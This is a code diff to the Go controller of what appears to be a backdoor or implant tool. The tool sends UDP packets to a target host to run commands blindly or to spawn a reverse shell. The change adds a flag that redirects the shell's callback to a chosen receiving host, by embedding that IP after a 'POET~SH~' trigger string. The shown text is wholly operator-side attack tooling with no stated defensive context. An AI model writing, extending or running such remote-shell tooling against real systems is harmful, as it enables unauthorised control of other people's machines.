@@ -11,6 +11,8 @@ import (
 	"sync"
 )
 
+const DEFIP = "127.0.0.2"
+
 //go:embed art.txt
 var f embed.FS
 
@@ -83,6 +85,7 @@ func main() {
 	var iFace string
 	var source string
 	var target string
+	var recv string
 	var command string
 	var shell bool
 
@@ -93,13 +96,14 @@ func main() {
 		return
 	}
 
-	flag.StringVar(&target, "t", "127.0.0.1", "IP address to target")
-	flag.StringVar(&command, "c", "NONE", "Single command to run through UDP. No output")
-	flag.BoolVar(&shell, "s", false, "Spawn and connect to reverse shell")
+	flag.StringVar(&target, "t", DEFIP, "Required: IP address to target")
+	flag.StringVar(&recv, "r", DEFIP, "Optional: Where to send the shell. Defaults to interface IP if not specified.")
+	flag.StringVar(&command, "c", "NONE", "Choice: Single command to run through UDP. No output")
+	flag.BoolVar(&shell, "s", false, "Choice: Spawn and connect to reverse shell")
 
 	flag.Parse()
 
-	if target == "127.0.0.1" {
+	if target == DEFIP {
 		flag.Usage()
 		return
 	}
@@ -109,10 +113,14 @@ func main() {
 		panic(err)
 	}
 
+	if recv == DEFIP {
+		recv = source
+	}
+
 	var opener string
 	wg := new(sync.WaitGroup)
 	if shell {
-		opener = "POET~SH~" + source
+		opener = "POET~SH~" + recv
 		wg.Add(1)
 		go shell_listen(source, wg) // listen in background
 	} else if command == "NONE" {
